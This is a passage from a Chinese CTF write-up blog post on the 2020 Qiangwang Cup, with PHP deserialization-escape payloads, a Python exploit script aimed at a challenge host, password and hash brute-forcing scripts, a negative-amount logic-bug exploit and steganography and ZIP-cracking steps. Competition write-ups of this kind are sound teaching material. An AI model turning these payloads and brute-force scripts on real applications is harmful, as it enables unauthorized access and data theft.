+password=1&quot;;s:7:&quot;%00*%00pass&quot;;O:7:&quot;topsolo&quot;:1:{S:7:&quot;%00*%00\6e\61\6d\65&quot;;O:7:&quot;midsolo&quot;:2:{S:7:&quot;%00*%00\6e\61\6d\65&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;%00*%00\6e\61\6d\65&quot;;s:7:&quot;Lee Sin&quot;;}}};s:8:&quot;\00*\00admin&quot;;i:1;}
+
+将%00换成\00的(注意将1&quot;;s:7换成1&quot;;S:7   暂时不晓得为什么):
+1&quot;;S:7:&quot;\00*\00pass&quot;;O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00\6e\61\6d\65&quot;;O:7:&quot;midsolo&quot;:2:{S:7:&quot;\00*\00\6e\61\6d\65&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00\6e\61\6d\65&quot;;s:7:&quot;Lee Sin&quot;;}}};s:8:&quot;\00*\00admin&quot;;i:1;}</code></pre><p>这样就成功将pop链序列化的结果填入了password中，使其被反序列化，打印flag。<br>也可以进行url编码(也可以不用编码)一下，得到最终payload：</p><pre><code class=php>username=qwzf%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0
+password=1%22;s:7:%22%00*%00pass%22;O:7:%22topsolo%22:1:{S:7:%22%00*%00%5C6e%5C61%5C6d%5C65%22;O:7:%22midsolo%22:2:{S:7:%22%00*%00%5C6e%5C61%5C6d%5C65%22;O:6:%22jungle%22:1:{S:7:%22%00*%00%5C6e%5C61%5C6d%5C65%22;s:7:%22Lee Sin%22;}}};s:8:%22%5C00*%5C00admin%22;i:1;}</code></pre><p><strong>方法二构造payload</strong>：<br>原理类似，吃的字符数不同。需要read()函数进行11次，也就是需要11个<code>%00*%00</code></p><pre><code class=php>username=qwzf\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0
+password=;s:7:&quot;%00*%00pass&quot;;O:7:&quot;topsolo&quot;:1:{S:7:&quot;%00*%00\6e\61\6d\65&quot;;O:7:&quot;midsolo&quot;:2:{S:7:&quot;%00*%00\6e\61\6d\65&quot;;O:6:&quot;jungle&quot;:1:{s:7:&quot;%00*%00\6e\61\6d\65&quot;;s:7:&quot;Lee Sin&quot;;}}};S:8:&quot;%00*%00admin&quot;;i:0;}</code></pre><p>传入后访问play.php，进行反序列化，得到flag。<br>为了方便直接写了个exp<br>exp：</p><pre><code class=py>import requests
+
+url=&quot;http://eci-2ze4mvter6u4z188kpmz.cloudeci1.ichunqiu.com/&quot;
+users=&quot;?username=qwzf%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0&quot;
+pwds=&#39;&amp;password=1%22;S:7:%22%5C00*%5C00pass%22;O:7:%22topsolo%22:1:{S:7:%22%5C00*%5C00%5C6e%5C61%5C6d%5C65%22;O:7:%22midsolo%22:2:{S:7:%22%5C00*%5C00%5C6e%5C61%5C6d%5C65%22;O:6:%22jungle%22:1:{s:7:%22%5C00*%5C00%5C6e%5C61%5C6d%5C65%22;s:7:%22Lee Sin%22;}}};S:8:%22%5C00*%5C00admin%22;i:1;}&#39;
+
+#传入payload
+urls=url+ users + pwds
+r=requests.get(urls)
+print(r.text)
+
+#访问play.php吃掉字符，输出进行反序列化后的结果
+res=requests.get(url+&quot;play.php&quot;)
+print(res.text)</code></pre><p>运行得到flag<br><img src=http://img-blog.csdnimg.cn/20200825021958693.jpg#pic_center alt=在这里插入图片描述></p><h3 id=0x04-强网先锋：upload><a href=#0x04-强网先锋：upload class=headerlink title="0x04 强网先锋：upload"></a>0x04 强网先锋：upload</h3><p><strong>考点：流量分析+steghide隐写</strong><br>下载解压题目，是一个流量包，筛选协议为http的流量包。发现<br><img src="http://img-blog.csdnimg.cn/20200825015332622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt=在这里插入图片描述><br>意思应该就是使用了steghide隐写，并且是含有密码的。查看下一个数据包，发现里面隐藏了一张jpg图片，提取出来<br><img src="http://img-blog.csdnimg.cn/20200825015531105.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt=在这里插入图片描述><br>因为没找到密码，所以直接使用steghide隐写工具不能提取出隐藏内容。<br>考虑使用脚本爆破密码：</p><pre><code class=py>#python3运行
+from subprocess import *
+
+def foo():
+    stegoFile=&#39;1.jpg&#39;#隐写的图片
+    extractFile=&#39;passwd.txt&#39;#爆破的密码
+    passFile=&#39;dic.txt&#39;#字典
+    errors=[&#39;could not extract&#39;,&#39;steghide --help&#39;,&#39;Syntax error&#39;]
+    cmdFormat=&#39;steghide extract -sf &quot;%s&quot; -xf &quot;%s&quot; -p &quot;%s&quot;&#39;
+    f=open(passFile,&#39;r&#39;)
+    for line in f.readlines():
+        cmd=cmdFormat %(stegoFile,extractFile,line.strip())
+        p=Popen(cmd,shell=True,stdout=PIPE,stderr=STDOUT)
+        content=str(p.stdout.read(),&#39;gbk&#39;)
+        for err in errors:
+            if err in content:
+                break
+        else:
+            print (content),
+            print (&#39;the passphrase is %s&#39; %(line.strip()))
+            f.close()
+            return
+if __name__ == &#39;__main__&#39;:
+    foo()
+    print (&#39;ok&#39;)
+    pass</code></pre><p><img src=http://img-blog.csdnimg.cn/20200825015617815.png alt=在这里插入图片描述><br>爆破得到密码123456，然后使用steghide工具提取含有密码的隐藏内容</p><pre><code class=bash>steghide extract -sf 1.jpg -p 123456</code></pre><p>得到flag</p><h3 id=0x05-强网先锋：bank><a href=#0x05-强网先锋：bank class=headerlink title="0x05 强网先锋：bank"></a>0x05 强网先锋：bank</h3><p><strong>考点：爆破hash+逻辑漏洞</strong><br>nc连过去发现是只有得到XXX，才能进行下一步。<br>找脚本爆破前三位即可，注意速度要快，因为这个nc连接每隔一会儿就会断</p><pre><code class=py>#python2运行
+#-*- coding:utf-8 -*-
+import string
+import hashlib
+import time
+import threading
+import sys
+
+string = input(&quot;your str：&quot;)
+sha256 = input(&quot;your sha256：&quot;)
+strr=&quot;ABCDEFGHIJKMLNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;
+
+def main1(asc1):
+    def main2(asc2):
+        def main3(asc3):
+                asc = asc1+asc2+asc3
+                proof=asc+string
+                digest = hashlib.sha256(proof.encode(&#39;utf-8&#39;)).hexdigest()
+                if digest == sha256:
+                    zhi =&#39;\n\n\n\n\n\n\n\n\n\n-------------------------------------\n&#39;+proof+&#39;\n&#39;+digest+&#39;\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n&#39;
+                    f = open(&quot;zhi.txt&quot;,&#39;w&#39;)
+                    f.write(zhi)
+                    f.close()
+                    print(&#39;\n\n\n\n\n\n\n\n\n\n-------------------------------------&#39;)
+                    print(proof+&#39;\n&#39;+digest+&#39;\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n&#39;)
+                    sys.exit(0)
+                    return 
+                #else:
+                    #day = time.asctime(time.localtime(time.time()))
+                    #print &quot;当前时间为：&quot; + day+&#39;\n&#39;
+                    #print proof+&quot;\n&quot;+digest+&quot;\n&quot;
+        for asc3 in strr:
+            t3 = threading.Thread(target=main3,args=(asc3,))
+            t3.start()
+    for asc2 in strr:
+        t2 = threading.Thread(target=main2,args=(asc2,))
+        t2.start()
+for asc1 in strr:
+    t1 = threading.Thread(target=main1,args=(asc1,))
+    t1.start()</code></pre><p>输入爆破出的XXX的值；然后输入队伍token。hint提示的是AES ECB模式加密(可能这才是预期解)。<br>发现需要买flag，需要1000现金，而自己有10现金。涉及现金，队友想到可能有逻辑漏洞，随便输入负数，发现自己的现金增加了。输入<code>qwzf -995</code>，和之前的10相加，够1000现金了，get flag，支付现金得到flag。</p><h3 id=0x06-Web：half-infiltration><a href=#0x06-Web：half-infiltration class=headerlink title="0x06 Web：half_infiltration"></a>0x06 Web：half_infiltration</h3><p><strong>考点：反序列化+内网攻击</strong><br>题目源码(自己添加注释后的)：</p><pre><code class=php>&lt;?php
+highlight_file(__FILE__);
+$flag=file_get_contents(&#39;ssrf.php&#39;);
+class Pass
+{
+    function read()
+    {
+        ob_start(); //打开输出控制缓冲
+        global $result; //函数内部的global,在函数内部的为局部变量，与外部互不干涉
+        print $result;
+
+    }
+}
+class User
+{
+    public $age,$sex,$num;
+    function __destruct()//析构函数，反序列化时调用
+    {
+        $student = $this-&gt;age; //将$age赋值给$student
+        $boy = $this-&gt;sex;     //将$sex赋值给$boy
+        $a = $this-&gt;num;       //将$num赋值给$a
+    $student-&gt;$boy();          //$student以对象调用的方式调用$boy方法
+    if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student)))
+    {
+        ob_end_clean(); //清空缓冲区并关闭输出缓冲
+        exit();
+    }
+    global $$a; //函数内部的global，声明可变变量
+    $result=$GLOBALS[&#39;flag&#39;]; //当前页面的全局变量$key = value的引用，即引用$flag的值
+        ob_end_clean();
+    }
+}
+if (isset($_GET[&#39;x&#39;])) {
+    echo &quot;&lt;br /&gt;&quot;.$_GET[&#39;x&#39;].&quot;&lt;br /&gt;&quot;;
+    $q=unserialize($_GET[&#39;x&#39;])-&gt;get_it();
+    print_r($q);
+}
+?&gt;</code></pre><p>构造poc</p><pre><code class=php>&lt;?php
+$qwzf = new User;
+$qwzf-&gt;age = new Pass;
+$qwzf-&gt;sex = &#39;read&#39;;
+$qwzf-&gt;num = &#39;result&#39;;
+
+$c = new User;
+$c-&gt;age = new Pass;
+$c-&gt;sex = &#39;read&#39;;
+$c-&gt;num = this;
+
+$test = serialize([$qwzf,$c]);
+var_dump($test);</code></pre><p>由于是第五空间do you know原题改的，所以直接修改payload得到：</p><pre><code class=php>a:3:{i:0;O:4:&quot;User&quot;:3:{s:3:&quot;age&quot;;O:4:&quot;Pass&quot;:0:{}s:3:&quot;boy&quot;;s:4:&quot;read&quot;;s:3:&quot;num&quot;;s:6:&quot;result&quot;;}i:0;O:4:&quot;User&quot;:3:{s:3:&quot;age&quot;;O:4:&quot;Pass&quot;:0:{}s:3:&quot;boy&quot;;s:4:&quot;read&quot;;s:3:&quot;num&quot;;s:4:&quot;this&quot;;}i:0;s:4:&quot;AAAA&quot;;}</code></pre><p>将payload传入，查看源代码，发现<br><img src="http://img-blog.csdnimg.cn/20200825025036876.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt=在这里插入图片描述><br>进了内网，内网服务没做出来。找到大师傅的博客如下：<br><a href=https://www.gem-love.com/ctf/2576.html#halfinfiltration target=_blank rel=noopener>2020第四届“强网杯”全国网络安全挑战赛初赛Writeup</a></p><h3 id=0x07-MISC：miscstudy><a href=#0x07-MISC：miscstudy class=headerlink title="0x07 MISC：miscstudy"></a>0x07 MISC：miscstudy</h3><p><strong>考点：流量分析+TLS解密+Base64+二进制作像素点画图+jphide隐写+文件分离+crc32碰撞+明文攻击+Python3盲水印+snow在html嵌入隐写信息</strong><br><strong>第一关</strong><br>筛选http数据包，得到<code>39.99.247.28/fonts/1</code><br><img src=http://img-blog.csdnimg.cn/2020083023502813.png alt=在这里插入图片描述><br>访问得到<code>flag{level1_begin_and_level2_is_come</code><br><img src="http://img-blog.csdnimg.cn/2020083023515257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt=在这里插入图片描述><br><strong>第二关</strong><br>第一关的内容，查询发现是TLS密文日志，保存到一个文件里。使用TLS密文日志在Wirshark解密流量：<br>打开Wireshark-&gt;编辑-&gt;首先项-&gt;Protocols-&gt;TLS-&gt;选择TLS密文日志文件<br><img src=http://img-blog.csdnimg.cn/20200831000414984.png alt=在这里插入图片描述><br>筛选http数据包，得到<code>47.244.9.130/images/4e5d47b2db53654959295bba216858932.png</code><br><img src=http://img-blog.csdnimg.cn/20200831000313193.png alt=在这里插入图片描述><br>访问得到一张图片，右键保存到本地。winhex打开发现后半部分有可疑信息IDAT，并且最后面的IDAT和IEND之间的信息应该是Base64编码：<code>bGV2ZWwzX3N0YXJ0X2l0</code><br><img src=http://img-blog.csdnimg.cn/20200831001242881.png alt=在这里插入图片描述><br>Base64解码得到：<code>level3_start_it</code><br><strong>第三关</strong><br>第二关发现的可疑IDAT，在上边还有3段，分别进行base64解码得到3600二进制数。想到利用脚本转化为图片。并且应该是像素点画图，1RGB值为(0,0,0)，0RGB值为(255,255,255)。拿个大师傅的脚本：</p><pre><code class=py>from PIL import Image
+MAX = 60
+pic = Image.new(&quot;RGB&quot;,(MAX, MAX))
+data = &quot;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001111111111110000000100110000100000000011100001111111111100001111111111110000000110111000100000000011100001111111111100001100000000110010011111110010000000001100111001000000000100001100000000110010000110110010000000000001111001000000000100001100111100110010000100110010011100000011101001001111100100001100111100110000100000001110011111110010000001001111100100001100111100110000000000001110011110110010000001001111100100001100111100110011100100111111111100110011100000001111100100001100000000110011000000000111100110110110000001000000000100001100000000110010011000000011100011111110011001000000000100001111111111110010011001001001100110110010011001111111111100001111111111110010011001001100000100110010011001111111111100000000000000000010011111110010011000111000100000000000000000000000000000000010001111100010011000011101100000000000000000001110011000111100000001000000011000001111111001111000111000000110000000000000000001000000011000000000011001000000000000000010000001000011100001000000111100110000011000000010000000001110011001111110000000000000010001001110011111000010011000001110011001111110000000000000011001001110011111000010011000001100111000000011111000000010000100000100100111000000100100000001100000000111011000000111000100001100000111000000000000000011100000111110011000001111111100001100011111110010000000000000111001001100000000001100000111001110011111001000100100000000111001001000000000001000000111001110011111001100100100000011100000110011111111000000011100001111111000001110011100000011000000010011111110000000011100001111111000000110001100000000000100000010000000000000011000001110011001000000100100000000000000000110000000000000000000001110011011100000000000000010001001111110000100000000100000011111111101111100000000000011000000001110000000111111100110000001100000000010000000000011100000001110000000111111100111000000100000000010000000001110000100111111111111000000011100111000011000001100000000001111000110001001100111000000011000011100011000000000000000001111100111001100100101111111111001111100001001110011111100001100000111110000100000000010000000111100011000000011100100001000000111110000100000000010000000111000011000000011100100000011011100000011100000000000000001110000011111000001100100000111111100000011000000000000000011100000001101000000100100001111100000110010000100000000011111000010000000001100010000000111100000000010000110000000000000000110000000001100000000000011100100000010011111000011100000001110000000111000100000001100111000111110011111001111111100001010011111111100011000001000111000111110011111001111111100001110011011111100011000000000000000000010011001001110000001110001111000001100000100000000000000000010011000001100000000110000011000001100000100001111111111110010011000111000110000111100011001001100111100001100000000110000111100000011111111001110001000001100111000001100000000110000111100000011111111001110011000001100111000001100111100110000100001000000100001001110011111111100000000001100111100110000100001000001100001001100001111111000000000001100111100110010011000111111111000111110000111000011011100001100111100110000011000110000000000000110000000000011011100001100111100110000011111110000000100001110011000000000011100001100000000110011100100111000011001111100011111111111100000001100000000110011100100111000011001111100011111111111100000001011111111010010011111110011111001001110011111100000011000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;
+i=0
+# print(len(data))
+for y in range (0,MAX):
+    for x in range (0,MAX):
+        if(data[i] == &#39;1&#39;):
+            pic.putpixel([x,y],(0, 0, 0))
+        else:
+            pic.putpixel([x,y],(255,255,255))
+        i = i+1
+pic.show()
+pic.save(&quot;flag.png&quot;)</code></pre><p>运行脚本，得到一个二维码图片，扫描得</p><pre><code class=bash>链接：http://pan.baidu.com/s/1wVJ7d0RLW8Rj-HOTL9Shug
+提取码：1lms</code></pre><p>下载发现是一个jpg图片，经过<code>stegdetect</code>分析，是jphide隐写</p><pre><code class=bash>stegdetect -tjopi -s 10.0 level4.jpg</code></pre><p><img src=http://img-blog.csdnimg.cn/2020083100483465.png#pic_center alt=在这里插入图片描述><br>使用stegbreak爆破密码。(stegbreak是stegdetect工具里的一个程序)</p><pre><code class=bash>stegbreak -r rules.ini -f password.txt -t p [stego_file]
+# password.txt为字典文件</code></pre><p><img src=http://img-blog.csdnimg.cn/20200831023546657.png alt=在这里插入图片描述><br>得到密码为<code>power123</code>。然后使用jphs的seek选项，输入两次密码<code>power123</code>提取隐藏信息</p><pre><code class=bash>http://pan.baidu.com/s/1o43y4UGkm1eP-RViC25aOw
+mrpt
+level4_here_all</code></pre><p><strong>第四关</strong><br>访问第三关的百度网盘链接，下载文件。解压发现level5、level6和level7都在压缩包里，并且还有张1.png图片。但<code>level5.png</code>解压失败，使用foremost工具分离出来了<code>level5.png</code>，打开即是本关的flag：<code>level5_is_aaa</code><br><strong>第五关</strong><br>打开level6.zip，发现有密码并且文件大小都很小，想到crc32碰撞。但通用脚本并没有碰撞出来内容。从wp了解到通用脚本只能碰撞4字节和6字节的。而这个是4字节和5字节的。于是直接拿来师傅的脚本碰撞：</p><pre><code class=py>#coding:utf-8
+#通用脚本：http://github.com/theonlypwner/crc32 目前适合4、6字节的
+import binascii
+import string
+# dic=string.printable   #各种打印字符
+dic=&#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39;
+crc1 = 0x9aeacc13  # 记得要以0x开头
+crc2 = 0xeed7e184
+crc3 = 0x289585af
+def CrackCrc5(crc):
+    for i in dic :
+        for j in dic:
+            for p in dic:
+                for q in dic:
+                    for h in dic:
+                        s=i+j+p+q+h
+                        if crc == (binascii.crc32(s.encode(&quot;ascii&quot;))):
+                            print (s)
+                            return 1
+def CrackCrc4(crc):
+    for i in dic :
+        for j in dic:
+            for p in dic:
+                for q in dic:
+                        s=i+j+p+q
+                        if crc == (binascii.crc32(s.encode(&quot;ascii&quot;))):
+                            print (s)
+                            return 1
+CrackCrc5(crc1)
+CrackCrc4(crc2)
+CrackCrc5(crc3)</code></pre><p>运行脚本，得到的内容为<code>level6_isready</code><br><strong>第六关</strong><br>打开level7.zip，发现依旧加密了。但加密的文件有1.png。而之前第四关解压出来的有一张未加密的1.png。于是想到明文攻击：<br>将<code>1.png</code>压缩成<code>1.zip</code><br>使用ARCHPR工具，选择攻击类型为明文。选择加密文件level.zip，明文文件1.zip。开始攻击<br>得到解密后的压缩包<code>level7_decrypted.zip</code>，解压发现两张一样的图<br>一般遇到两张一样的图，可以想到：双图、盲水印。测试后发现要使用python3版本的</p><pre><code class=py>python3 bwmforpy3.py decode 4.png 5.png result.png</code></pre><p><img src="http://img-blog.csdnimg.cn/20200831033342332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt=在这里插入图片描述></p><pre><code class=bash>level7ishere
+39.99.247.28/final_level</code></pre><p><strong>第七关</strong><br>访问第六关得到的地址<code>39.99.247.28/final_level</code>，额，没找到关键信息。瞟一眼wp，发现snow，第一印象想成了whitespace隐写，然而并不是。看一下大师傅这部分的完整wp：</p><blockquote><p>这里是静态页面且目录下无法扫到其它的东西。那么应该是一种隐写。最后发现存在 snow 在html嵌入隐写信息，我们可以直接去解密网站在线解密 <a href=http://fog.misty.com/perry/ccs/snow/snow/snow.html target=_blank rel=noopener>http://fog.misty.com/perry/ccs/snow/snow/snow.html</a> 但是这里我们还需要知道其密码。经过反复尝试和查找，发现其密码居然是 no one can find me</p></blockquote><p>额，这就很明确了。考察的是在html嵌入隐写信息，直接使用解密网站解密，密码是在源代码处发现的<code>no one can find me</code>，解密得到<code>the_misc_examaaaaaaa_!!!}</code></p><p>七关拼在一起就是最终flag!</p><h3 id=0x08-后记><a href=#0x08-后记 class=headerlink title="0x08 后记"></a>0x08 后记</h3><p>总的来说，这次强网杯比赛收获很大。学到的新知识有：<code>md4</code>、<code>反序列化逃逸</code>、<code>steghide隐写爆破密码</code>、<code>hash碰撞</code>、<code>TLS解密</code>、<code>二进制作像素点画图</code>、<code>jphide隐写</code>、<code>4字节和5字节的crc32碰撞</code>、<code>snow在html嵌入隐写信息</code><br>参考：<a href=https://www.gem-love.com/ctf/2576.html#halfinfiltration target=_blank rel=noopener>2020第四届“强网杯”全国网络安全挑战赛初赛Writeup</a></p><hr><span style="font-style: italic;color: gray;">转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 qwzf1024@qq.com</span></div></article><p><a class=dashang onclick=dashangToggle()>赏</a></p><div id=vcomment class=comment></div><script src=//cdn1.lncld.net/static/js/3.0.4/av-min.js></script><script src=//unpkg.com/valine/dist/Valine.min.js></script><script src=https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js></script><script>
+    var notify = 'true' == true ? true : false;
+    var verify = 'true' == true ? true : false;
+    new Valine({
+        av: AV,
+        el: '#vcomment',
+        notify: notify,
+        app_id: "5cXOwuHg0Yrf8teE1lzRCjHi-gzGzoHsz",
+        app_key: "ToPzd33a36q3VXf83omuntVV",
+        placeholder: "快来评论呀！",
+        avatar:"mp",
+        recordIP: "true",
+        enableQQ: "true"
+    });
+</script></div><div class=copyright><p class=footer-entry><span class=miit><img src=/img/gov.png title=中华人民共和国工业和信息化部> <a href="http://beian.miit.gov.cn/">豫ICP备20008873号</a></span> ©2019-2020 Qwzf</p><p class=footer-entry>Built with <a href="https://hexo.io/" target=_blank>Hexo</a> and <a href=https://github.com/yelog/hexo-theme-3-hexo target=_blank>3-hexo</a> theme</p></div><div class=full-toc><button class=full data-title="切换全屏 快捷键 s"><span class=min></span></button> <a id=rocket></a></div></div><div class=hide_box onclick=dashangToggle()></div><div class=shang_box><a class=shang_close onclick=dashangToggle()>×</a><div class=shang_tit><p>喜欢就点赞,疼爱就打赏</p></div><div class=shang_payimg><div class=pay_img><img src=/img/alipay.jpg class=alipay title=扫码支持> <img src=/img/weixin.jpg class=weixin title=扫码支持></div></div><div class=shang_payselect><span><label><input type=radio name=pay checked value=alipay>支付宝</label></span><span><label><input type=radio name=pay value=weixin>微信</label></span></div></div><script src=/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body><script src="/js/jquery.pjax.js?v=1.1.0"></script><script>
+  function unmouse(){ 
+  document.oncontextmenu = new Function("return false;");
+  document.onkeydown = document.onkeyup = document.onkeypress = function(event) {
+      var e = event || window.event || arguments.callee.caller.arguments[0];
+      if (e && (e.keyCode == 123 || (e.keyCode == 116 && e.type!='keypress'))) 
+      {
+          e.returnValue = false;
+          return (false);
+      }
+  }
+  }
+  unmouse()
+</script><script src="/js/script.js?v=1.1.0"></script><script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script><style>
+    
+    
+    .nav {
+        width: 572px;
+    }
+    .nav.fullscreen {
+        margin-left: -572px;
+    }
+    .nav-left {
+        width: 150px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    #post .pjax article .article-entry>ol, #post .pjax article .article-entry>ul, #post .pjax article>ol, #post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    #post .pjax article .article-entry li>ol, #post .pjax article .article-entry li>ul,#post .pjax article li>ol, #post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    #post .pjax article .article-entry>ol>li, #post .pjax article .article-entry>ul>li,#post .pjax article>ol>li, #post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    #post .pjax article .article-entry li>ol>li, #post .pjax article .article-entry li>ul>li,#post .pjax article li>ol>li, #post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://img-blog.csdnimg.cn/20200726174858546.png");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style></html>
